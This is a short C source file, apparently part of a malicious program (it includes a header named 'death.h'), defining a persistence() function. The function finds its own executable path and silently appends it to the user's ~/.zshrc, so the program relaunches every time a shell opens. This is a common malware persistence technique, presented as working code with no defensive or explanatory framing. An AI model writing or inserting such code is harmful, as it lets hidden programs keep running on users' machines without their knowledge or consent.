#include "death.h"
#include <unistd.h>
#include <limits.h>
#include <stdio.h>

void persistence()
{
    char script_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", script_path, sizeof(script_path) - 1);
    script_path[len] = '\0';
	
    const char *home = getenv("HOME");
    if (!home)
        return;

    char zshrc_path[512];
    snprintf(zshrc_path, sizeof(zshrc_path), "%s/.zshrc", home);

    FILE *file = fopen(zshrc_path, "r");
    if (!file)
        return;

    char buffer[1024];
    int found = 0;

    while (fgets(buffer, sizeof(buffer), file)) {
        if (strstr(buffer, script_path) != NULL) {
            found = 1;
            break;
        }
    }
    fclose(file);

    if (!found) {
        file = fopen(zshrc_path, "a");
        if (!file)
            return;

        fprintf(file, "\n%s\n", script_path);
        fclose(file);
    }
}